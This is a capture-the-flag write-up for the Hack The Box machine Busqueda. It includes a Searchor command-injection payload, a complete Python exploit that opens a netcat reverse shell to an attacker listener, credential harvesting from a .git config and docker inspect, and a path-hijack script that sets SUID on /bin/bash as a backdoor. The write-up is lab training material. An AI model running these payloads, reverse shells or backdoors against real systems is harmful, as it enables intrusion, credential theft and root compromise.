---
title: 'HTB Busqueda - Easy'
date: 2024-05-07 00:00:00 +0000
categories: [HTB Machines]
tags: [Easy, Linux, HTB]
---

**Busqueda** is an easy HTB machine where we can achieve RCE by leveraging a **command injection CVE**. Following this, we gain root access by exploiting a **path hijacking vulnerability** uncovered through enumeration.

<img src="/assets/images/busqueda/Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.16.142

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.16.142 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

22, 80

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.16.142 -sVC -p22,80

[+] NSE Scan results: 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 14:52 WEST
Nmap scan report for 10.129.16.142
Host is up (0.062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.07 seconds

[+] Script finished successfully
```

Let’s add the newly discovered domain to /etc/hosts.

```bash
echo -e "10.129.16.142\tsearcher.htb" | sudo tee -a /etc/hosts
10.129.16.142   searcher.htb
```

The web page on port TCP/80 appears to offer a searching functionality with different engines.

<img src="/assets/images/busqueda/Untitled 1.png" style="width:800px;">

There is a Searchor version at the bottom.

<img src="/assets/images/busqueda/Untitled 2.png" style="width:800px;">

Further enumeration shows that this version is vulnerable to a **command injection vulnerability**.

<img src="/assets/images/busqueda/Untitled 3.png" style="width:800px;">

Source: https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection.

# Exploitation

After playing with Burp Suite for a while, we finally achieved **remote code execution (RCE)**.

```
myquery+'),__import__('os').system('whoami')#
```

<img src="/assets/images/busqueda/Untitled 4.png" style="width:800px;">

For learning’s sake I created a Python PoC. I recommend you to create your own.

```python
import argparse
import requests
import sys

def send_revshell(target, lhost, lport):
    try:
        if not lhost:
            raise Exception("\n[!] You must provide a lhost to receive a reverse shell connection.")
        
        url = f'http://{target}/search'
        headers = {
            'Host':'searcher.htb',
            'Content-Type':'application/x-www-form-urlencoded'
        }
        command = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f'
        data = {
            'engine': 'Google',
            'query': f'myquery+\'),__import__(\'os\').system(\'{command}\')#'
        }

        print("\n[+] Sending a reverse shell")
        requests.post(url, headers=headers, data=data, timeout=2)
    
    except requests.Timeout:
        print("\n[+] Check your netcat listener! :)")
        sys.exit(0)

def shell(target):
    url = f'http://{target}/search'
    headers = {
        'Host':'searcher.htb',
        'Content-Type':'application/x-www-form-urlencoded'
    }

    while True:
        try:
            command = ""
            command = input("\n$ ")

            if command == "exit" or command == "quit":
                raise Exception("\n[!] Quitting!")

            elif command:
                data = {
                    'engine': 'Google',
                    'query': f'myquery+\'),__import__(\'os\').system(\'{command}\')#'
                }
                response = requests.post(url, headers=headers, data=data)
                
                if response.status_code == 200:
                    output = response.text.split('\n')
                    print('\n'.join(line for line in output if not line == output[-1]))
        
        except KeyboardInterrupt:
            print("\n[!] Keyboard interrumpt detected. Quitting!")
            sys.exit(1)

def set_arguments():
    parser = argparse.ArgumentParser(
        description="HTB Busqueda exploit"
    )
    parser.add_argument('-t', '--target', dest='target', required=True)
    parser.add_argument('-r', '--reverse-shell', dest='reverse', action='store_true')
    parser.add_argument('--lhost', dest='lhost', help="local address for reverse shell")
    parser.add_argument('--lport', dest='lport', default=4444, type=int, help="local port for reverse shell. Default: 4444")
    return parser.parse_args()

def main():
    try:
        args = set_arguments()
        if args.reverse:
            send_revshell(args.target, args.lhost, args.lport)
        else:
            shell(args.target)
    
    except Exception as e:
        print(e)
        sys.exit(1)

main()
```

By specifying a target, we can execute commands in a non-interactive shell.

```bash
python3 busqueda.py -t 10.129.16.142
```

<img src="/assets/images/busqueda/Untitled 5.png" style="width:800px;">

We have the option to send us a reverse shell and transform it into a pseudo interactive TTY.

```bash
python3 busqueda.py -t 10.129.16.142 -r --lhost 10.10.14.112
```

<img src="/assets/images/busqueda/Untitled 6.png" style="width:800px;">

<img src="/assets/images/busqueda/Untitled 7.png" style="width:800px;">

Before moving to PE, let’s read the user flag.

```bash
svc@busqueda:/var/www/app$ cat /home/svc/user.txt 
e2fb90c70cd7ec6e****************
```

# PrivEsc

The directory where we landed contains a **hidden .git directory**

```bash
svc@busqueda:/var/www/app$ ls -lah
total 20K
drwxr-xr-x 4 www-data www-data 4.0K Apr  3  2023 .
drwxr-xr-x 4 root     root     4.0K Apr  4  2023 ..
-rw-r--r-- 1 www-data www-data 1.1K Dec  1  2022 app.py
**drwxr-xr-x 8 www-data www-data 4.0K May  7 13:50 .git**
drwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 templates
```

There is a config file with clear-text credentials and a new subdomain we didn’t know about.

```bash
svc@busqueda:/var/www/app/.git$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:<REDACTED>@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

The sites-enabled directory confirms the existence of a vHost subdomain.

```bash
svc@busqueda:/var/www/app/.git$ cat /etc/apache2/sites-enabled/000-default.conf
...
<VirtualHost *:80>
        ProxyPreserveHost On
        ServerName gitea.searcher.htb
        ServerAdmin admin@searcher.htb
        ProxyPass / http://127.0.0.1:3000/
        ProxyPassReverse / http://127.0.0.1:3000/

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

Checking sudoers permissions of svc user with the gathered password shows something of interest.

```bash
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Apparently, this script uses docker on the bg.

```bash
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

There are two containers.

```bash
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE          
960873171e2e   gitea/gitea:latest  ...
f84a6b33fb5a   mysql:8             ...
```

And one of them has a credentials for another user.

```bash
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}'  960873171e2e | jq .
{
...
    "GITEA__database__DB_TYPE=mysql",
    "GITEA__database__HOST=db:3306",
    "GITEA__database__NAME=gitea",
    "GITEA__database__USER=gitea",
    "GITEA__database__PASSWD=<REDACTED>",
...
}
```

To proceed, we will append the new vHost subdomain to /etc/hosts

```bash
tail -n 1 /etc/hosts
10.129.16.142   searcher.htb gitea.searcher.htb
```

And access the subdomain from our browser.

<img src="/assets/images/busqueda/Untitled 8.png" style="width:800px;">

The credentials found in the .git config file were valid and we manged to gather another user called ‘administrator’ from our feed.

<img src="/assets/images/busqueda/Untitled 9.png" style="width:800px;">

<img src="/assets/images/busqueda/Untitled 10.png" style="width:800px;">

There wasn’t much in Cody’s account. Surprisingly, the password from the docker container belongs to the administrator user. Now, we have much more fun stuff to enumerate.

<img src="/assets/images/busqueda/Untitled 11.png" style="width:800px;">

<img src="/assets/images/busqueda/Untitled 12.png" style="width:800px;">

The scripts repository looks extremely familiar.

<img src="/assets/images/busqueda/Untitled 13.png" style="width:800px;">

In fact, the system-checkup.py is the same script we were able to execute as root. If we look carefully, the 47th line has a **relative path**. We could try to exploit it.

<img src="/assets/images/busqueda/Untitled 14.png" style="width:800px;">

This bash script will create a **backdoor** for us.

```bash
svc@busqueda:~$ echo -e '#!/bin/bash\nchmod +s /bin/bash' > full-checkup.sh; chmod +x full-checkup.sh

svc@busqueda:~$ ls
full-checkup.sh  user.txt
```

After executing the full-checkup command, /bin/bash has a SUID flag. 

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
[+] Done!

svc@busqueda:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

Last step would be to read the root flag. GGs!

```bash
svc@busqueda:~$ /bin/bash -p
bash-5.1# whoami
root

bash-5.1# cat /root/root.txt
43878bda2998e4ed****************

bash-5.1# exit
exit
```